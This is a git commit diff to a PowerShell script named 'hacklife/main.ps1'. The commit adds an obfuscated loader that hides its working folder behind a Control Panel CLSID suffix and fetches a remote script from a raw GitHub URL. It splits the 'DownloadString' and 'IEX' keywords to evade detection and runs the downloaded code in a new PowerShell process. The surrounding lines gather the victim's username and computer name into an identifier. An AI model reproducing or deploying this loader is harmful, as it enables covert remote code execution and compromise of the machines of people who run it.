1d00b31c121674999c107f05dedae56953c7959a
43a1723 <hai1723notgay@gmail.com>
2024-08-04 09:57:52 +0700

    Update main.ps1

--- Extras/hacklife/main.ps1
+++ Extras/hacklife/main.ps1
@@ -1,3 +1,16 @@
+$rdir = "C:\Users\Loader"
+$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}\trick"
+
+New-Item -ItemType Directory -Path $dir
+
+cd $dir
+
+$shellcode = "https://raw.githubusercontent.com/43a1723/test/main/Extras/hacklife/output.ps1"
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+$process = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+Wait-Process -Id $process.Id
+
+
 $u = ("u$env:username" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
 $c = ("c$env:computername" -replace '[^a-zA-Z0-9\-]+', '')[0..63] -join ''
 $id = ""
